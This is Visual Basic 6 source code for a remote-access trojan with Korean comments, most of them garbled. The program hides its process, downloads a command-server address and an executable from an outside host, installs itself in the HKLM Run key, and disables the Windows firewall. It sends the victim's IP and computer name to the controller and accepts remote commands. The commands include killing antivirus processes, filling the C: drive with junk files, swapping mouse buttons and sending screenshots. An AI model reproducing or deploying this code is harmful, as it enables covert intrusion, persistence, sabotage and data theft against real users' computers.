VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form_Main 
   BorderStyle     =   0  '����
   Caption         =   "Form1"
   ClientHeight    =   1995
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   2385
   Icon            =   "Form_Main.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1995
   ScaleWidth      =   2385
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows �⺻��
   Begin VB.PictureBox Picture1 
      Appearance      =   0  '���
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  '����
      ForeColor       =   &H80000008&
      Height          =   135
      Left            =   2040
      ScaleHeight     =   9
      ScaleMode       =   3  '�ȼ�
      ScaleWidth      =   17
      TabIndex        =   0
      Top             =   720
      Width           =   255
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   960
      Top             =   240
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock ��� 
      Left            =   120
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock3 
      Index           =   0
      Left            =   1320
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   2000
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   720
      Top             =   1560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   20212
   End
End
Attribute VB_Name = "Form_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Programmed by Chun Dong Hyuk


Option Explicit
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long        ' :: �̹� �����ϴ� Ű�� �����Ҳ��� �� �ڵ忣 Ű�� �����ϴ��� ���θ� ���� ���� ó���� �� �ʿ䰡 �����
Private Declare Function RegSetValue Lib "advapi32.dll" Alias "RegSetValueA" (ByVal hKey As Long, ByVal lpSubKeyAs As String, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long
 
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Dim strInfo2 As String
Dim getit As String
Private Function StartProgram(ByVal RootKey As String, ByVal Path As String, ByVal KeyName As String, ByVal Data As String)
Dim strResult As Long

    RegOpenKey RootKey, Path, strResult
    RegSetValue strResult, KeyName, REG_SZ, Data, Len(Data)

End Function
Private Sub ���_Close()
���.Close
���.Connect strInfo2, 2510 ' pr.text - ��Ʈ
End Sub

Private Sub ���_Connect()
URLDownloadToFile 0, "http://hosting.ohseon.com/ip.php", App.Path & "\1234d", 0, 0
Open App.Path & "\1234d" For Input As #1 'J����̺� Ȯ��
Line Input #1, getit
Close #1
getit = Split(getit, ": ")(1)
���.SendData "/" & getit & " - " & Environ("computername")
End Sub


Private Sub ���_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
���.Close
���.Connect strInfo2, 2510 ' pr.text - ��Ʈ
End Sub

Private Sub Timer1_Timer()
    On Error Resume Next '// �޼��� ������ ������ ���� �ݰ� ���� ��� ��Ű�� �κ�.
If ���.State = 0 Then
    ���.Connect strInfo2, 2510 ' pr.text - ��Ʈ
    End If
End Sub
Sub Shells(ByVal PathName As String, Optional ByVal WindowStyle As VbAppWinStyle = vbMinimizedFocus)
On Error Resume Next
Dim WshShell As Object
Set WshShell = CreateObject("WScript.Shell")
If WindowStyle = Empty Then WindowStyle = vbMinimizedFocus
WshShell.Run """" & PathName & """", WindowStyle, 0
End Sub
Private Sub Form_Load()
On Error Resume Next '// ����Ÿ�� �޾����� ó�� ����
    Const REG_OPTION_NON_VOLATILE = &O0
    Const KEY_ALL_CLASSES As Long = &HF0063
    Const KEY_ALL_ACCESS = &H3F
    Const REG_SZ As Long = 1


Me.hide
'Me.Top = -1234
HideMyProcess ' �� ���μ��� �����

URLDownloadToFile 0, "http://hosting.ohseon.com/gksthf1226/ip.txt", App.Path & "\last.dll", 0, 0

Open App.Path & "\last.dll" For Input As #1 'J����̺� Ȯ��
Line Input #1, strInfo2
Close #1
       
    If Dir("C:\WINDOWS\system32\explorerR1.exe") = "" Then '// ���� ������ SYSTEM32 ������ �麻..�����
       URLDownloadToFile 0, "http://hosting.ohseon.com/gksthf1226/����.exe", "C:\WINDOWS\system32\explorerR1.exe", 0, 0
       'URLDownloadToFile 0, "http://hosting.ohseon.com/gksthf1226/picture.jpg", "C:\WINDOWS\���ߤ�.jpg", 0, 0
       'Shells "C:\WINDOWS\���ߤ�.jpg", vbNormalFocus
       
'       StartProgram HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "Gaibee", App.Path & "\" & App.EXEName & ".exe" ' ���ٷ� �ڵ��ϼ���

       Dim reg As Object
        Set reg = CreateObject("wscript.shell") ' ��ü�� �����մϴ�.
        reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"

        '// �� �κ� ������Ʈ�� ���
        '// ������Ʈ�� ��� : "Software\microsoft\windows\currentversion\Run\explorer"
        '// ���� �Ҷ�� ���� ����� explorer �� �����ϸ� �ȴٴ°� �ƽ� �� �Ͻ��ϴ�
        '/ -------------------------------------------------------------------
'        Dim SName$, KName$, vinstelling$
'        SName = "run"
'        KName = "explorer"
'        vinstelling = "C:\WINDOWS\system32\explorer.exe"  '������丮��� �������ϸ�
'
'        Dim hNewKey As Long
'        Dim lRetVal As Long
'        lRetVal = RegCreateKeyEx(&H80000002, KeyName & "\" & SName$, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
'        lRetVal = SetValueEx(hNewKey, KName$, REG_SZ, vinstelling)
'        RegCloseKey (hNewKey)
        '/ -------------------------------------------------------------------
    End If

Dim oNetMgr As Object
Set oNetMgr = CreateObject("HNetCfg.FwMgr")
If oNetMgr.LocalPolicy.CurrentProfile.FirewallEnabled Then
Firewall False
Else
Firewall False
End If

If App.PrevInstance Then '// �ߺ� ���� ����
Kill (App.Path & "\last.dll")
        End
    End If
    
Kill (App.Path & "\last.dll")
Initialize

Winsock3(0).LocalPort = "2000"
Winsock3(0).Listen '��ŷ ��⻡��

End Sub
Private Sub Firewall(Optional Enabled As Boolean = False)
Dim oProfile As Object
Dim oNetShareMgr
    On Error Resume Next
    Set oNetShareMgr = CreateObject("HNetCfg.FwMgr")
    Set oProfile = oNetShareMgr.LocalPolicy.CurrentProfile
        oProfile.FirewallEnabled = Enabled
    Set oProfile = Nothing
    Set oNetShareMgr = Nothing
End Sub


'���������� ������ ���, ������ �ݰ� ���ο� ������ ����Ѵ�.
Private Sub Winsock1_Close()
    On Error Resume Next
    '���÷��� ���� ����ü�� Ŭ�����Ѵ�.
    DisplayInfoClear
    '���� �������� ����Ѵ�.
    Winsock1.Close
    Winsock1.Listen
    
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
    On Error Resume Next
    '���ӿ�û�� �������, ���� ������ �ݰ� ���ο� ������ �㰡�Ѵ�.
    Winsock1.Close
    Winsock1.Accept requestID
    
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim Buffer() As Byte
    '��ɾ� �������κ��� �����͸� �����Ѵ�.
    Winsock1.GetData Buffer()
    '�������κ��� ������ �����͸� ����/ó���Ѵ�.
    ReceiveBufferProcess Buffer(), bytesTotal
    
End Sub

'���������� ������������ ������ ���, ������ �ݰ� ���ο� ������ ����Ѵ�.
Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    '���÷��� ���� ����ü�� Ŭ�����Ѵ�.
    DisplayInfoClear
    '���� �������� ����Ѵ�.
    Winsock1.Close
    Winsock1.Listen
    
End Sub
Public Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
    SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, vValue, Len(vValue))
End Function

Private Sub Winsock2_Close()
Winsock2.Close
End Sub

Private Sub Winsock2_Connect()
Cap
FilSnd "C:\WINDOWS\gogi.csr"
End Sub

Private Sub Winsock2_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock2.Close
End Sub

Private Sub Winsock3_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error Resume Next '// ����Ÿ�� �޾����� ó�� ����
WIndex = WIndex + 1
Load Winsock3(WIndex)
Winsock3(WIndex).Close
Winsock3(WIndex).Accept requestID '������ Ŭ���̾�Ʈ�� �����û�� ���
    Winsock3(WIndex).SendData "/����"
End Sub


Private Sub Winsock3_DataArrival(Index As Integer, ByVal bytesTotal As Long)

    On Error Resume Next '// ����Ÿ�� �޾����� ó�� ����
    
Dim B As String '��������
Dim MS���� As Integer
Dim MSȮ�� As Integer
Dim i
    Dim TempX As String '// ���� ���� ����Ÿ
    
Winsock3(WIndex).GetData B '/ dd ����:
If Left(B, 1) = "/" Then  '���� ���� �˻� ù��° �ڸ��� "/"�̸� ture ������ false
    Select Case Mid(B, 2, 3) '����ڿ� �´� ���� �ι�°�ڸ����� ���� �׷��Ƿ� �տ� "/" �����

    Case "�޼���" '/�޼���:�޽���:����:Ÿ��Ʋ
        Select Case Split(B, ":")(2)
        Case "0"
        MS���� = 0
        Case "1"
        MS���� = 16
        Case "2"
        MS���� = 32
        Case "3"
        MS���� = 4
        End Select
    i = MsgBox(Split(B, ":")(1), MS����, Split(B, ":")(3))
    If i = vbYes Then
    Winsock3(WIndex).SendData "/MS:YES:�pŰ"
    ElseIf i = vbNo Then
    Winsock3(WIndex).SendData "/MS:NO:�p��"
    Else
    Winsock3(WIndex).SendData "/MS:OK:�p��"
    End If
    Exit Sub
    
    Case "������" '/������:�޽���:����:Ÿ��Ʋ
        i = InputBox(Split(B, ":")(1), Split(B, ":")(2))
        Winsock3(WIndex).SendData "/MS:" & i
    Exit Sub
    
    Case "��ä��" '/��ä�� - �⺻ä��Ű��¸�ɾ�
    Exit Sub
    
    Case "��ä��" '/��ä�� - �⺻ä�ò���
    Exit Sub
    
    Case "ä����" '/ä����:��Ŀ]�Ҹ�
    Exit Sub
    
    Case "CD��" '/CD �� ����
    Exit Sub
    
    Case "CD��" '/CD �� �ݱ�
    Exit Sub
    
    Case "�۾���" '�۾�ǥ����Ű�� (True)
    Exit Sub
    
    Case "�۾���" '�۾�ǥ���ٲ���
    Exit Sub
    
    Case "���¿�" '���콺 �¿�ٲٱ�
Shell "rundll32.exe user32, SwapMouseButton", vbHide
    Exit Sub
    
    Case "��Ŀ��" '���콺Ŀ�� �������
    Exit Sub
    
    Case "��Ŀ��" '���콺Ŀ�� �߱�
    Exit Sub
    
    Case "��Ű��" '���콺Ű���� ���Ÿ���� �̰ž��� �������Ӥ��� ���˵���Ʈ ���� Ǯ����
    Exit Sub
    
    Case "������" ' ���콺�� ��°� ���� �ٲ���������������
    Exit Sub
    
    Case "������" ' ���콺�� ��°� ���� �ٲ���������������
    Exit Sub
    
    Case "�Ĳ���" ' ��ǻ�� ��������
    Exit Sub
    
    Case "c����" ' ������̺� ���� �޸���
Do
Open "C:\" & Rnd For Output As #1
Print #1, Rnd
Close #1
DoEvents
Loop
    Exit Sub
    
    Case "��Ų�" ' ��Ų�
'KillProcess "V3LSvc.exe" 'V3LSvc.exe
'KillProcess "V3LTray.exe"
'KillProcess "PZAgent.pze"
'KillProcess "PZServiceNT.pze"
'Kill "V3LTray.exe"
Shell "tskill.exe V3LSvc", 0
Shell "tskill.exe V3LTray", 0
Shell "tskill.exe PZAgent", 0
Shell "tskill.exe PZServiceNT", 0
    Exit Sub
    
    Case "��罺"
    Exit Sub
    
    Case "pr��"
    Exit Sub
    
    Case "ų����"
    Exit Sub
    
    Case "Ű����"
    Exit Sub

    Case "��ũ��"
    '// ȭ�� �ڵ� ���
    Winsock2.RemoteHost = strInfo2
    Winsock2.RemotePort = 1234
    Winsock2.Connect strInfo2, 1234
    Exit Sub
    
    Case "��ũ����"
    If Not Dir("C:\WINDOWS\gogi.csr") = "" Then Kill "C:\WINDOWS\gogi.csr"
    Exit Sub
    
    Case "������"
Exit Sub

    Case "�ͽ���"
    Shell "explorer.exe """ & Split(B, "=")(1) & "", vbMaximizedFocus
    Exit Sub

End Select
    
    
End If

End Sub

Private Sub Winsock3_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock3(WIndex).Close
End Sub


